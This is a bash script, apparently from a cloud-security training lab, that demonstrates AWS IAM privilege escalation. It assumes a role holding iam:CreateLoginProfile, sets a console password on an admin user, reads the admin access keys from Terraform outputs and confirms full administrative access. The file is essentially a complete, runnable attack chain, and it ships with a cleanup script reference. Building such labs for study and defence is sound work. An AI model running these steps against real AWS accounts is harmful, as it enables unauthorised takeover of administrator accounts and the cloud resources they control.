#!/bin/bash

# Demo script for iam:CreateLoginProfile privilege escalation
# This script demonstrates how a role with CreateLoginProfile permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
PRIVESC_ROLE="pl-clp-clifford"
ADMIN_USER="pl-clp-admin"

# Generate a random password suffix (8 characters)
RANDOM_SUFFIX=$(openssl rand -hex 6)  # Generates 8 hex characters
PASSWORD="PathfinderLabs123!${RANDOM_SUFFIX}"  # Password with random suffix for uniqueness

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateLoginProfile Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Verify starting user identity
echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID
echo -e "${YELLOW}Step 2: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 3: Assume the privilege escalation role
echo -e "${YELLOW}Step 3: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-attack-session \
    --profile $PROFILE \
    --output json)

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')

# Verify role assumption
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ROLE_IDENTITY"

if [[ ! $ROLE_IDENTITY == *"$PRIVESC_ROLE"* ]]; then
    echo -e "${RED}Error: Failed to assume $PRIVESC_ROLE${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully assumed $PRIVESC_ROLE${NC}\n"

# Step 4: Check if admin user already has a login profile
echo -e "${YELLOW}Step 4: Checking if admin user has a login profile${NC}"
echo "Checking for existing login profile for user: $ADMIN_USER"

if aws iam get-login-profile --user-name $ADMIN_USER &> /dev/null; then
    echo -e "${RED}⚠ Login profile already exists for $ADMIN_USER${NC}"
    echo "Please run ./cleanup_attack.sh first to remove the existing login profile"
    exit 1
else
    echo -e "${GREEN}✓ Confirmed: No login profile exists (ready for attack)${NC}"
fi
echo ""

# Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 6: Create login profile for admin user
echo -e "${YELLOW}Step 6: Creating login profile for admin user${NC}"
echo "Creating console password for user: $ADMIN_USER"
echo "Password: $PASSWORD"

aws iam create-login-profile \
    --user-name $ADMIN_USER \
    --password "$PASSWORD" \
    --no-password-reset-required

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created login profile!${NC}"
else
    echo -e "${RED}Failed to create login profile${NC}"
    exit 1
fi
echo ""

# Step 7: Display console login information
echo -e "${YELLOW}Step 7: Console login information${NC}"
CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
echo "Console login URL: $CONSOLE_URL"
echo "Username: $ADMIN_USER"
echo "Password: $PASSWORD"
echo ""

# Step 8: Get admin user's access keys to verify admin access programmatically
echo -e "${YELLOW}Step 8: Retrieving admin user's access keys for verification${NC}"

# Get the access keys from Terraform outputs
TERRAFORM_DIR="../../../../../.."  # Navigate to root directory
pushd $TERRAFORM_DIR > /dev/null

ACCESS_KEY_ID=$(terraform output -json | jq -r '.prod_one_hop_to_admin_iam_createloginprofile[0].admin_access_key_id.value' 2>/dev/null || echo "")
SECRET_ACCESS_KEY=$(terraform output -json | jq -r '.prod_one_hop_to_admin_iam_createloginprofile[0].admin_secret_access_key.value' 2>/dev/null || echo "")

popd > /dev/null

if [ -z "$ACCESS_KEY_ID" ] || [ "$ACCESS_KEY_ID" == "null" ]; then
    echo -e "${YELLOW}Note: Unable to retrieve access keys from Terraform outputs${NC}"
    echo "You can verify admin access by logging into the AWS console with the credentials above"
else
    echo -e "${GREEN}✓ Retrieved admin user's access keys${NC}"

    # Step 9: Verify admin access using the admin user's credentials
    echo -e "\n${YELLOW}Step 9: Verifying administrative access${NC}"
    echo "Testing admin permissions with admin user's API credentials..."

    # Configure admin credentials
    export AWS_ACCESS_KEY_ID=$ACCESS_KEY_ID
    export AWS_SECRET_ACCESS_KEY=$SECRET_ACCESS_KEY
    unset AWS_SESSION_TOKEN

    # List IAM users (admin permission)
    if aws iam list-users --max-items 3 --output table; then
        echo -e "\n${GREEN}✓ Successfully listed IAM users - admin access confirmed!${NC}"
    else
        echo -e "${YELLOW}Could not verify via API, but console access is available${NC}"
    fi
fi

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "2. Assumed role: $PRIVESC_ROLE (with CreateLoginProfile permission)"
echo "3. Created login profile for: $ADMIN_USER"
echo "4. Admin console access available at: $CONSOLE_URL"

echo -e "\n${YELLOW}Attack artifacts:${NC}"
echo "- Login profile created for user $ADMIN_USER"
echo "- Console password set to: $PASSWORD"

echo -e "\n${YELLOW}Next steps:${NC}"
echo "1. Open the console URL in a browser: $CONSOLE_URL"
echo "2. Login with username: $ADMIN_USER and password: $PASSWORD"
echo "3. You now have full administrative access through the console!"

echo -e "\n${RED}⚠ Warning: A login profile now exists for the admin user!${NC}"
echo "Run ./cleanup_attack.sh to remove the login profile"